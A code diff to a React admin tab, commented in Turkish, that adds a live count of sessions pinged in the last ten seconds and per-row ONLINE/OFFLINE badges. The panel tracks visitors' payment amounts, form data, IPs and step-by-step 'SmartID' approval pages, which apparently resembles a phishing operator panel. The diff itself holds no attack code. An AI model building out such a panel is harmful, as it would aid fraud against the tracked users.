@@ -1,10 +1,10 @@
 "use client";
 
-import { useCallback, useEffect, useState, useRef, Fragment } from "react";
+import { useCallback, useEffect, useState, useRef, Fragment, useMemo } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 
-const SESSION_COLUMNS = "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
+const SESSION_COLUMNS = "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "smartid_1", label: "SmartID 1 Sayfası" },
@@ -141,6 +141,27 @@ export function AuditLogsTab({ darkMode, user }: { darkMode: boolean; user?: any
 
   const [logCount, setLogCount] = useState(0);
   const [hiddenCount, setHiddenCount] = useState(0);
+  // CANLI ONLINE SAYISI (LogsTab ile birebir ayni, ANLIK)
+  const LIVE_WINDOW_MS = 10 * 1000;
+  const liveOnlineNow = useMemo(() => {
+    let n = 0;
+    const now = Date.now();
+    for (const row of rows) {
+      if (row.status === "offline") continue;
+      if (!row.last_ping_at) continue;
+      try {
+        const t = Date.parse(String(row.last_ping_at));
+        if (Number.isFinite(t) && now - t < LIVE_WINDOW_MS) n++;
+      } catch { /* noop */ }
+    }
+    return n;
+  }, [rows]);
+  // Her 2 snde bir canli guncelleme zorla (useMemo Date.now() bagli olmadigi icin tick)
+  const [, setTick] = useState(0);
+  useEffect(() => {
+    const t = window.setInterval(() => setTick((x) => x + 1), 2_000);
+    return () => window.clearInterval(t);
+  }, []);
   const [loading, setLoading] = useState(true);
   const [queryError, setQueryError] = useState<string | null>(null);
   const reqRef = useRef(0);
@@ -256,7 +277,7 @@ export function AuditLogsTab({ darkMode, user }: { darkMode: boolean; user?: any
       <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
         <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-[#EB5E28]" title="Eski Log (Toplam)" value={logCount} darkMode={darkMode} />
         <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-amber-500" title="Arşivlenmiş (Gizli)" value={hiddenCount} darkMode={darkMode} />
-        <StatCard icon="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" color="text-green-500" title="Canlı Izleme (Realtime)" value={loading ? 0 : 1} darkMode={darkMode} />
+        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Şu An Aktif (Canlı)" value={liveOnlineNow} darkMode={darkMode} />
       </div>
 
       {queryError && (
@@ -450,17 +471,33 @@ export function AuditLogsTab({ darkMode, user }: { darkMode: boolean; user?: any
                             <span className="w-1.5 h-1.5 rounded-full bg-amber-500"></span>
                             ARŞİV
                           </span>
-                        ) : (row.status === "offline" ? (
-                          <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
-                            <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
-                            OFFLINE
-                          </span>
-                        ) : (
-                          <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-600 dark:text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
-                            <span className="w-1.5 h-1.5 rounded-full bg-green-500"></span>
-                            ONLINE
-                          </span>
-                        ))}
+                        ) : (() => {
+                          // LogsTab ile BIREBIR ayni CANLI ONLINE / OFFLINE kuralı
+                          // (2sn tick + postgres_changes realtime ile neredeyse ANLIK)
+                          let online = false;
+                          if (row.status !== "offline") {
+                            if (row.last_ping_at) {
+                              try {
+                                const t = Date.parse(String(row.last_ping_at));
+                                if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) online = true;
+                              } catch { /* noop */ }
+                            }
+                          }
+                          if (online) {
+                            return (
+                              <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-600 dark:text-green-500 border border-green-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                                <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
+                                ONLINE
+                              </span>
+                            );
+                          }
+                          return (
+                            <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[9px] font-bold tracking-wide whitespace-nowrap">
+                              <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
+                              OFFLINE
+                            </span>
+                          );
+                        })()}
                       </td>
                       <td className="px-2 py-3 align-top text-right">
                         <div className="ml-auto flex w-full max-w-[168px] flex-col items-end justify-end gap-1.5">
